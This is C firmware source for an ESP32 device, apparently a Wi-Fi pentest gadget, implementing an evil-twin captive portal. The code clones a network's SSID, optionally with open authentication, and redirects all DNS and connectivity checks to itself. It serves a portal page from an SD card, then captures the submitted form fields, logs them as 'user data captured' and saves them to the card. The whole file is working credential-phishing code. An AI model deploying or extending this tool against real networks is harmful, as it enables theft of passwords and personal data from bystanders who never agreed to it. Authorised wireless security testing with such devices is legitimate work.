// SPDX-License-Identifier: MIT
// Copyright (c) 2026 THE POOM

#include "poom_wifi_captive.h"

#include <stdbool.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "bsp_pong.h"
#include "dns_server.h"
#include "esp_err.h"
#include "esp_http_server.h"
#include "esp_log.h"
#include "esp_netif.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "lwip/inet.h"
#include "poom_wifi_ctrl.h"
#include "sd_card.h"
#include "ws2812.h"

/**
 * @file poom_wifi_captive.c
 * @brief Captive portal module: AP+STA Wi-Fi, HTTP portal, DNS redirect.
 */

/* =========================
 * Local log macros (printf)
 * ========================= */
#if CAPTIVE_MODULE_LOG_ENABLED
    static const char *CAPTIVE_MODULE_TAG = "captive_module";

    #define CAPTIVE_MODULE_PRINTF_E(fmt, ...) \
        printf("[E] [%s] %s:%d: " fmt "\n", CAPTIVE_MODULE_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define CAPTIVE_MODULE_PRINTF_W(fmt, ...) \
        printf("[W] [%s] %s:%d: " fmt "\n", CAPTIVE_MODULE_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #define CAPTIVE_MODULE_PRINTF_I(fmt, ...) \
        printf("[I] [%s] %s:%d: " fmt "\n", CAPTIVE_MODULE_TAG, __func__, __LINE__, ##__VA_ARGS__)

    #if CAPTIVE_MODULE_DEBUG_LOG_ENABLED
        #define CAPTIVE_MODULE_PRINTF_D(fmt, ...) \
            printf("[D] [%s] %s:%d: " fmt "\n", CAPTIVE_MODULE_TAG, __func__, __LINE__, ##__VA_ARGS__)
    #else
        #define CAPTIVE_MODULE_PRINTF_D(...) do { } while (0)
    #endif
#else
    #define CAPTIVE_MODULE_PRINTF_E(...) do { } while (0)
    #define CAPTIVE_MODULE_PRINTF_W(...) do { } while (0)
    #define CAPTIVE_MODULE_PRINTF_I(...) do { } while (0)
    #define CAPTIVE_MODULE_PRINTF_D(...) do { } while (0)
#endif

/* =========================
 * Local constants
 * ========================= */
#define CAPTIVE_MODULE_MAX_STA_CONN                 (4)
#define CAPTIVE_MODULE_QUERY_PARAM_MAX_LEN          (254U)
#define CAPTIVE_MODULE_USER_DUMP_MAX_LEN            (512U)
#define CAPTIVE_MODULE_FILE_IO_CHUNK_LEN            (512U)
#define CAPTIVE_MODULE_LED_RESOLUTION_HZ            (10 * 1000 * 1000)
#define CAPTIVE_MODULE_LED_BRIGHTNESS               (20U)
#define CAPTIVE_MODULE_LED_BLINK_MS                 (800U)

#ifndef CONFIG_POOM_STA_SSID
#define CONFIG_POOM_STA_SSID                        "AP"
#endif

#ifndef CONFIG_POOM_STA_PASS
#define CONFIG_POOM_STA_PASS                        "123456"
#endif

/* Embedded pages linked by linker script. */
extern const char root_start[] asm("_binary_root_html_start");
extern const char root_end[] asm("_binary_root_html_end");
extern const char redirect_start[] asm("_binary_redirect_html_start");
extern const char redirect_end[] asm("_binary_redirect_html_end");

/* =========================
 * Local state
 * ========================= */
typedef struct {
    char *user1;
    char *user2;
    char *user3;
    char *user4;
} captive_module_user_ctx_t;

typedef struct {
    bool started;
    bool wifi_initialized;
    bool event_handler_registered;
    bool led_initialized;
    httpd_handle_t http_server;
    dns_server_handle_t dns_server;
    ws2812_strip_t strip;
} captive_module_state_t;

static captive_module_state_t s_state = {0};
static captive_module_user_ctx_t s_user_ctx = {0};

static char s_portal_file[CAPTIVE_PORTAL_MAX_DEFAULT_LEN] = CAPTIVE_PORTAL_DEFAULT_NAME;
static char s_sta_ssid[33] = CONFIG_POOM_STA_SSID;
static char s_sta_pass[65] = CONFIG_POOM_STA_PASS;
static char s_ap_clone_ssid[33] = {0};
static bool s_ap_clone_open_auth = false;

/* =========================
 * Local helpers
 * ========================= */
static int captive_module_hex_to_int_(char c)
{
    if((c >= '0') && (c <= '9')) {
        return c - '0';
    }
    if((c >= 'A') && (c <= 'F')) {
        return c - 'A' + 10;
    }
    if((c >= 'a') && (c <= 'f')) {
        return c - 'a' + 10;
    }
    return -1;
}

static char *captive_module_strdup_(const char *src)
{
    size_t len = 0U;
    char *dst = NULL;

    if(src == NULL) {
        return NULL;
    }

    len = strlen(src);
    dst = (char *)malloc(len + 1U);
    if(dst == NULL) {
        return NULL;
    }

    memcpy(dst, src, len + 1U);
    return dst;
}

static char *captive_module_url_decode_(const char *input)
{
    size_t len = 0U;
    size_t i = 0U;
    size_t j = 0U;
    char *output = NULL;

    if(input == NULL) {
        return NULL;
    }

    len = strlen(input);
    output = (char *)malloc(len + 1U);
    if(output == NULL) {
        CAPTIVE_MODULE_PRINTF_E("failed to allocate URL decode buffer");
        return NULL;
    }

    while((i < len) && (j < len)) {
        if((input[i] == '%') &&
           ((i + 2U) < len) &&
           isxdigit((unsigned char)input[i + 1U]) &&
           isxdigit((unsigned char)input[i + 2U])) {
            int high = captive_module_hex_to_int_(input[i + 1U]);
            int low = captive_module_hex_to_int_(input[i + 2U]);
            if((high >= 0) && (low >= 0)) {
                output[j] = (char)((high << 4) | low);
                i += 3U;
            } else {
                output[j] = input[i];
                i++;
            }
        } else if(input[i] == '+') {
            output[j] = ' ';
            i++;
        } else {
            output[j] = input[i];
            i++;
        }
        j++;
    }

    output[j] = '\0';
    return output;
}

static void captive_module_free_user_ctx_(void)
{
    if(s_user_ctx.user1 != NULL) {
        free(s_user_ctx.user1);
        s_user_ctx.user1 = NULL;
    }
    if(s_user_ctx.user2 != NULL) {
        free(s_user_ctx.user2);
        s_user_ctx.user2 = NULL;
    }
    if(s_user_ctx.user3 != NULL) {
        free(s_user_ctx.user3);
        s_user_ctx.user3 = NULL;
    }
    if(s_user_ctx.user4 != NULL) {
        free(s_user_ctx.user4);
        s_user_ctx.user4 = NULL;
    }
}

static void captive_module_show_user_creds_(const char *user_str)
{
    CAPTIVE_MODULE_PRINTF_I("user data captured:\n%s", (user_str != NULL) ? user_str : "");
}

static void captive_module_set_led_color_(uint8_t r, uint8_t g, uint8_t b)
{
    if((!s_state.led_initialized) || (s_state.strip.led_count <= 0)) {
        return;
    }

    for(int i = 0; i < s_state.strip.led_count; ++i) {
        ws2812_set_pixel(&s_state.strip, i, r, g, b, 0);
    }
    (void)ws2812_show(&s_state.strip);
}

static void captive_module_init_led_strip_(void)
{
    if(s_state.led_initialized) {
        captive_module_set_led_color_(0U, 0U, 0U);
        return;
    }

    if(ws2812_init(&s_state.strip,
                   PIN_NUM_WS2812,
                   PIN_NUM_LEDS,
                   false,
                   CAPTIVE_MODULE_LED_RESOLUTION_HZ) != ESP_OK) {
        CAPTIVE_MODULE_PRINTF_W("ws2812 init failed");
        return;
    }

    ws2812_set_brightness(&s_state.strip, CAPTIVE_MODULE_LED_BRIGHTNESS);
    s_state.led_initialized = true;
    captive_module_set_led_color_(0U, 0U, 0U);
}

static void captive_module_deinit_led_strip_(void)
{
    if(!s_state.led_initialized) {
        return;
    }

    captive_module_set_led_color_(0U, 0U, 0U);
    ws2812_deinit(&s_state.strip);
    memset(&s_state.strip, 0, sizeof(s_state.strip));
    s_state.led_initialized = false;
}

static void captive_module_send_embedded_root_(httpd_req_t *req)
{
    size_t page_len = (size_t)(root_end - root_start);
    httpd_resp_send(req, root_start, page_len);
}

static void captive_module_send_embedded_redirect_(httpd_req_t *req)
{
    size_t page_len = (size_t)(redirect_end - redirect_start);
    httpd_resp_send(req, redirect_start, page_len);
}

static void captive_module_load_sta_creds_from_sd_(void)
{
    char path[128];

    if(sd_card_is_not_mounted()) {
        CAPTIVE_MODULE_PRINTF_W("SD not mounted, using compiled defaults");
        return;
    }

    snprintf(path, sizeof(path), "%s/%s", SD_CARD_PATH, SSID_DATA_PATH);
    path[sizeof(path) - 1U] = '\0';

    FILE *f = fopen(path, "r");
    if(f == NULL) {
        char line[128];

        CAPTIVE_MODULE_PRINTF_W("SSID file '%s' not found, creating defaults", SSID_DATA_PATH);
        snprintf(line, sizeof(line), "%s,%s\n", s_sta_ssid, s_sta_pass);

        (void)sd_card_create_file(SSID_DATA_PATH);
        (void)sd_card_append_to_file(SSID_DATA_PATH, line);
        return;
    }

    char line[128];
    if(fgets(line, sizeof(line), f) == NULL) {
        CAPTIVE_MODULE_PRINTF_E("cannot read '%s', using defaults", SSID_DATA_PATH);
        fclose(f);
        return;
    }
    fclose(f);

    char *newline = strpbrk(line, "\r\n");
    if(newline != NULL) {
        *newline = '\0';
    }

    char *comma = strchr(line, ',');
    if(comma == NULL) {
        CAPTIVE_MODULE_PRINTF_E("invalid format in '%s' (expected ssid,password)", SSID_DATA_PATH);
        return;
    }

    *comma = '\0';
    const char *ssid_str = line;
    const char *pass_str = comma + 1;

    strncpy(s_sta_ssid, ssid_str, sizeof(s_sta_ssid) - 1U);
    s_sta_ssid[sizeof(s_sta_ssid) - 1U] = '\0';

    strncpy(s_sta_pass, pass_str, sizeof(s_sta_pass) - 1U);
    s_sta_pass[sizeof(s_sta_pass) - 1U] = '\0';

    CAPTIVE_MODULE_PRINTF_I("STA credentials loaded from SD: SSID='%s'", s_sta_ssid);
}

static void captive_module_wifi_event_handler_(const poom_wifi_ctrl_evt_info_t *info, void *user_ctx)
{
    (void)user_ctx;

    if((info != NULL) && (info->evt == POOM_WIFI_CTRL_EVT_STA_GOT_IP)) {
        CAPTIVE_MODULE_PRINTF_I("STA got IP: " IPSTR, IP2STR(&info->ip));
    }
}

static esp_err_t captive_module_wifi_init_apsta_(void)
{
    wifi_config_t sta_config = {0};
    wifi_config_t ap_config = {0};
    const char *ap_ssid = NULL;
    esp_err_t ret;

    ret = poom_wifi_ctrl_init_apsta();
    if(ret != ESP_OK) {
        CAPTIVE_MODULE_PRINTF_E("poom_wifi_ctrl_init_apsta failed: %s", esp_err_to_name(ret));
        return ret;
    }

    s_state.wifi_initialized = true;

    strncpy((char *)sta_config.sta.ssid, s_sta_ssid, sizeof(sta_config.sta.ssid));
    sta_config.sta.ssid[sizeof(sta_config.sta.ssid) - 1U] = '\0';

    strncpy((char *)sta_config.sta.password, s_sta_pass, sizeof(sta_config.sta.password));
    sta_config.sta.password[sizeof(sta_config.sta.password) - 1U] = '\0';

    sta_config.sta.threshold.authmode = WIFI_AUTH_WPA2_PSK;
    sta_config.sta.sae_pwe_h2e = WPA3_SAE_PWE_BOTH;

    ap_ssid = (s_ap_clone_ssid[0] != '\0') ? s_ap_clone_ssid : (const char *)sta_config.sta.ssid;

    strncpy((char *)ap_config.ap.ssid,
            ap_ssid,
            sizeof(ap_config.ap.ssid));
    ap_config.ap.ssid[sizeof(ap_config.ap.ssid) - 1U] = '\0';
    ap_config.ap.ssid_len = strlen((const char *)ap_config.ap.ssid);

    size_t pass_len = strlen((const char *)sta_config.sta.password);
    if(s_ap_clone_open_auth || (pass_len < 8U)) {
        if(pass_len > 0U) {
            CAPTIVE_MODULE_PRINTF_W("AP running OPEN auth");
        }
        ap_config.ap.authmode = WIFI_AUTH_OPEN;
        ap_config.ap.password[0] = '\0';
    } else {
        strncpy((char *)ap_config.ap.password,
                (const char *)sta_config.sta.password,
                sizeof(ap_config.ap.password));
        ap_config.ap.password[sizeof(ap_config.ap.password) - 1U] = '\0';
        ap_config.ap.authmode = WIFI_AUTH_WPA_WPA2_PSK;
    }

    ap_config.ap.max_connection = CAPTIVE_MODULE_MAX_STA_CONN;

    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    if(ret != ESP_OK) {
        CAPTIVE_MODULE_PRINTF_E("esp_wifi_set_config AP failed: %s", esp_err_to_name(ret));
        return ret;
    }

    ret = esp_wifi_set_config(WIFI_IF_STA, &sta_config);
    if(ret != ESP_OK) {
        CAPTIVE_MODULE_PRINTF_E("esp_wifi_set_config STA failed: %s", esp_err_to_name(ret));
        return ret;
    }

    (void)esp_wifi_set_channel(6, WIFI_SECOND_CHAN_NONE);

    ret = esp_wifi_connect();
    if(ret != ESP_OK) {
        CAPTIVE_MODULE_PRINTF_W("esp_wifi_connect returned: %s", esp_err_to_name(ret));
    }

    esp_netif_t *ap_netif = esp_netif_get_handle_from_ifkey(CAPTIVE_PORTAL_NET_NAME);
    if(ap_netif != NULL) {
        esp_netif_ip_info_t ip_info = {0};
        if(esp_netif_get_ip_info(ap_netif, &ip_info) == ESP_OK) {
            char ip_addr[16];
            inet_ntoa_r(ip_info.ip.addr, ip_addr, sizeof(ip_addr));
            CAPTIVE_MODULE_PRINTF_I("SoftAP SSID: %s IP: %s", (char *)ap_config.ap.ssid, ip_addr);
        }
    }

    CAPTIVE_MODULE_PRINTF_I("STA connecting to SSID: %s", (char *)sta_config.sta.ssid);
    captive_module_set_led_color_(0U, 0U, 255U);
    return ESP_OK;
}

static esp_err_t captive_module_http_root_get_handler_(httpd_req_t *req)
{
    if(req == NULL) {
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "text/html");

    if(sd_card_is_not_mounted()) {
        CAPTIVE_MODULE_PRINTF_W("SD not mounted, serving embedded root");
        captive_module_send_embedded_root_(req);
        return ESP_OK;
    }

    char path[1024];
    snprintf(path, sizeof(path), "%s/%s/%s", SD_CARD_PATH, CAPTIVE_PORTAL_PATH_NAME, s_portal_file);

    FILE *file = fopen(path, "r");
    if(file == NULL) {
        CAPTIVE_MODULE_PRINTF_W("failed to open '%s', serving embedded root", path);
        captive_module_send_embedded_root_(req);
        return ESP_OK;
    }

    char buffer[CAPTIVE_MODULE_FILE_IO_CHUNK_LEN];
    size_t bytes_read = 0U;

    while((bytes_read = fread(buffer, 1, sizeof(buffer) - 1U, file)) > 0U) {
        buffer[bytes_read] = '\0';
        if(httpd_resp_sendstr_chunk(req, buffer) != ESP_OK) {
            fclose(file);
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "failed to send response chunk");
            return ESP_FAIL;
        }
    }

    fclose(file);
    httpd_resp_sendstr_chunk(req, NULL);
    return ESP_OK;
}

static void captive_module_read_and_store_query_param_(const char *query,
                                                        const char *key,
                                                        char **out_value)
{
    char param[CAPTIVE_MODULE_QUERY_PARAM_MAX_LEN];

    if((query == NULL) || (key == NULL) || (out_value == NULL)) {
        return;
    }

    if(httpd_query_key_value(query, key, param, sizeof(param)) != ESP_OK) {
        return;
    }

    *out_value = captive_module_url_decode_(param);
    if(*out_value == NULL) {
        *out_value = captive_module_strdup_(param);
    }

    if(*out_value != NULL) {
        CAPTIVE_MODULE_PRINTF_I("%s: %s", key, *out_value);
    }
}

static esp_err_t captive_module_http_validate_get_handler_(httpd_req_t *req)
{
    size_t query_len = 0U;
    char *query_buf = NULL;
    char user_dump[CAPTIVE_MODULE_USER_DUMP_MAX_LEN];

    if(req == NULL) {
        return ESP_FAIL;
    }

    captive_module_free_user_ctx_();

    query_len = httpd_req_get_url_query_len(req);
    if(query_len > 0U) {
        query_buf = (char *)malloc(query_len + 1U);
        if(query_buf == NULL) {
            CAPTIVE_MODULE_PRINTF_E("failed to allocate query buffer");
            httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "memory allocation failed");
            return ESP_FAIL;
        }

        if(httpd_req_get_url_query_str(req, query_buf, query_len + 1U) == ESP_OK) {
            captive_module_read_and_store_query_param_(query_buf, CAPTIVE_USER_INPUT1, &s_user_ctx.user1);
            captive_module_read_and_store_query_param_(query_buf, CAPTIVE_USER_INPUT2, &s_user_ctx.user2);
            captive_module_read_and_store_query_param_(query_buf, CAPTIVE_USER_INPUT3, &s_user_ctx.user3);
            captive_module_read_and_store_query_param_(query_buf, CAPTIVE_USER_INPUT4, &s_user_ctx.user4);
        }
    }

    snprintf(user_dump,
             sizeof(user_dump),
             "\nuser1: %s\nuser2: %s\nuser3: %s\nuser4: %s\n\n",
             (s_user_ctx.user1 != NULL) ? s_user_ctx.user1 : "",
             (s_user_ctx.user2 != NULL) ? s_user_ctx.user2 : "",
             (s_user_ctx.user3 != NULL) ? s_user_ctx.user3 : "",
             (s_user_ctx.user4 != NULL) ? s_user_ctx.user4 : "");

    captive_module_show_user_creds_(user_dump);

    if(!sd_card_is_not_mounted()) {
        (void)sd_card_create_file(CAPTIVE_DATA_PATH);
        (void)sd_card_append_to_file(CAPTIVE_DATA_PATH, user_dump);
    }

    captive_module_set_led_color_(255U, 0U, 0U);
    vTaskDelay(pdMS_TO_TICKS(CAPTIVE_MODULE_LED_BLINK_MS));
    captive_module_set_led_color_(0U, 0U, 255U);

    if(query_buf != NULL) {
        free(query_buf);
    }

    httpd_resp_set_status(req, "302 Temporary Redirect");
    httpd_resp_set_hdr(req, "Location", "/redirect");
    httpd_resp_send(req, "Thanks for your data, redirecting...", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t captive_module_http_404_handler_(httpd_req_t *req, httpd_err_code_t err)
{
    (void)err;

    httpd_resp_set_status(req, "302 Temporary Redirect");
    httpd_resp_set_hdr(req, "Location", "/");
    httpd_resp_send(req, "Redirect to captive portal", HTTPD_RESP_USE_STRLEN);
    return ESP_OK;
}

static esp_err_t captive_module_http_detect_handler_(httpd_req_t *req)
{
    if(req == NULL) {
        return ESP_FAIL;
    }

    if((strstr(req->uri, "connectivitycheck") != NULL) ||
       (strstr(req->uri, "generate_204") != NULL) ||
       (strstr(req->uri, "hotspot-detect.html") != NULL) ||
       (strstr(req->uri, "ncsi.txt") != NULL)) {
        httpd_resp_set_status(req, "200 OK");
        httpd_resp_set_type(req, "text/plain");
        httpd_resp_send(req, "Captive Portal", HTTPD_RESP_USE_STRLEN);
        return ESP_OK;
    }

    return captive_module_http_404_handler_(req, HTTPD_404_NOT_FOUND);
}

static esp_err_t captive_module_http_redirect_handler_(httpd_req_t *req)
{
    if(req == NULL) {
        return ESP_FAIL;
    }

    httpd_resp_set_type(req, "text/html");
    captive_module_send_embedded_redirect_(req);
    return ESP_OK;
}

static const httpd_uri_t s_root_uri = {
    .uri = "/",
    .method = HTTP_GET,
    .handler = captive_module_http_root_get_handler_,
};

static const httpd_uri_t s_validate_uri = {
    .uri = "/validate",
    .method = HTTP_GET,
    .handler = captive_module_http_validate_get_handler_,
};

static const httpd_uri_t s_detect_uri = {
    .uri = "/*",
    .method = HTTP_GET,
    .handler = captive_module_http_detect_handler_,
};

static const httpd_uri_t s_redirect_uri = {
    .uri = "/redirect",
    .method = HTTP_GET,
    .handler = captive_module_http_redirect_handler_,
};

static httpd_handle_t captive_module_start_webserver_(void)
{
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    httpd_handle_t server = NULL;

    config.max_open_sockets = 6;
    config.lru_purge_enable = true;
    config.max_resp_headers = 10;

    if(httpd_start(&server, &config) != ESP_OK) {
        CAPTIVE_MODULE_PRINTF_E("failed to start HTTP server");
        return NULL;
    }

    if((httpd_register_uri_handler(server, &s_root_uri) != ESP_OK) ||
       (httpd_register_uri_handler(server, &s_validate_uri) != ESP_OK) ||
       (httpd_register_uri_handler(server, &s_detect_uri) != ESP_OK) ||
       (httpd_register_uri_handler(server, &s_redirect_uri) != ESP_OK) ||
       (httpd_register_err_handler(server, HTTPD_404_NOT_FOUND, captive_module_http_404_handler_) != ESP_OK)) {
        CAPTIVE_MODULE_PRINTF_E("failed to register HTTP handlers");
        httpd_stop(server);
        return NULL;
    }

    CAPTIVE_MODULE_PRINTF_I("HTTP server started");
    return server;
}

static esp_err_t captive_module_init_sd_layout_(void)
{
    if(sd_card_is_not_mounted()) {
        esp_err_t ret = sd_card_mount();
        if(ret != ESP_OK) {
            CAPTIVE_MODULE_PRINTF_W("sd_card_mount failed: %s", esp_err_to_name(ret));
            return ret;
        }
    }

    (void)sd_card_create_dir(CAPTIVE_PORTALS_FOLDER_PATH);
    (void)sd_card_create_dir(CAPTIVE_DATAUSER_PATH);
    return ESP_OK;
}

static void captive_module_wifi_stack_stop_(void)
{
    esp_err_t ret;

    if(!s_state.wifi_initialized) {
        return;
    }

    ret = poom_wifi_ctrl_sta_disconnect();
    if((ret != ESP_OK) && (ret != ESP_ERR_WIFI_NOT_INIT)) {
        CAPTIVE_MODULE_PRINTF_W("poom_wifi_ctrl_sta_disconnect failed: %s", esp_err_to_name(ret));
    }

    ret = poom_wifi_ctrl_deinit();
    if((ret != ESP_OK) && (ret != ESP_ERR_WIFI_NOT_INIT)) {
        CAPTIVE_MODULE_PRINTF_W("poom_wifi_ctrl_deinit failed: %s", esp_err_to_name(ret));
    }

    s_state.wifi_initialized = false;
}

static void captive_module_stop_services_(void)
{
    if(s_state.dns_server != NULL) {
        stop_dns_server(s_state.dns_server);
        s_state.dns_server = NULL;
    }

    if(s_state.http_server != NULL) {
        httpd_stop(s_state.http_server);
        s_state.http_server = NULL;
        CAPTIVE_MODULE_PRINTF_I("HTTP server stopped");
    }

    if(s_state.event_handler_registered) {
        (void)poom_wifi_ctrl_unregister_cb();
        s_state.event_handler_registered = false;
    }

    captive_module_wifi_stack_stop_();

    captive_module_free_user_ctx_();
    captive_module_deinit_led_strip_();
    s_state.started = false;
}

static esp_err_t captive_module_start_services_(void)
{
    esp_err_t ret;

    esp_log_level_set("httpd_uri", ESP_LOG_ERROR);
    esp_log_level_set("httpd_txrx", ESP_LOG_ERROR);
    esp_log_level_set("httpd_parse", ESP_LOG_ERROR);

    ret = poom_wifi_ctrl_register_cb(captive_module_wifi_event_handler_, NULL);
    if(ret != ESP_OK) {
        CAPTIVE_MODULE_PRINTF_E("poom_wifi_ctrl_register_cb failed: %s", esp_err_to_name(ret));
        return ret;
    }
    s_state.event_handler_registered = true;

    ret = captive_module_wifi_init_apsta_();
    if(ret != ESP_OK) {
        return ret;
    }

    s_state.http_server = captive_module_start_webserver_();
    if(s_state.http_server == NULL) {
        return ESP_FAIL;
    }

    dns_server_config_t dns_cfg = DNS_SERVER_CONFIG_SINGLE("*", CAPTIVE_PORTAL_NET_NAME);
    s_state.dns_server = start_dns_server(&dns_cfg);
    if(s_state.dns_server == NULL) {
        CAPTIVE_MODULE_PRINTF_W("DNS server failed to start");
    }

    s_state.started = true;
    return ESP_OK;
}

/* =========================
 * Public API
 * ========================= */
void poom_wifi_captive_set_portal_file(const char *filename)
{
    if(filename == NULL) {
        return;
    }

    strncpy(s_portal_file, filename, sizeof(s_portal_file) - 1U);
    s_portal_file[sizeof(s_portal_file) - 1U] = '\0';
}

void poom_wifi_captive_set_ap_clone(const char *ssid, bool open_auth)
{
    s_ap_clone_open_auth = open_auth;

    if((ssid == NULL) || (ssid[0] == '\0')) {
        s_ap_clone_ssid[0] = '\0';
        return;
    }

    strncpy(s_ap_clone_ssid, ssid, sizeof(s_ap_clone_ssid) - 1U);
    s_ap_clone_ssid[sizeof(s_ap_clone_ssid) - 1U] = '\0';
}

void poom_wifi_captive_start(void)
{
    if(s_state.started) {
        captive_module_stop_services_();
    }

    captive_module_init_led_strip_();

    if(captive_module_init_sd_layout_() != ESP_OK) {
        CAPTIVE_MODULE_PRINTF_W("continuing with embedded pages only");
    }

    captive_module_load_sta_creds_from_sd_();

    strncpy(s_portal_file, CAPTIVE_PORTAL_DEFAULT_NAME, sizeof(s_portal_file) - 1U);
    s_portal_file[sizeof(s_portal_file) - 1U] = '\0';

    if(captive_module_start_services_() != ESP_OK) {
        CAPTIVE_MODULE_PRINTF_E("failed to start captive module");
        captive_module_stop_services_();
        return;
    }

    CAPTIVE_MODULE_PRINTF_I("captive portal running (AP+STA)");
}

void poom_wifi_captive_stop(void)
{
    captive_module_stop_services_();
}
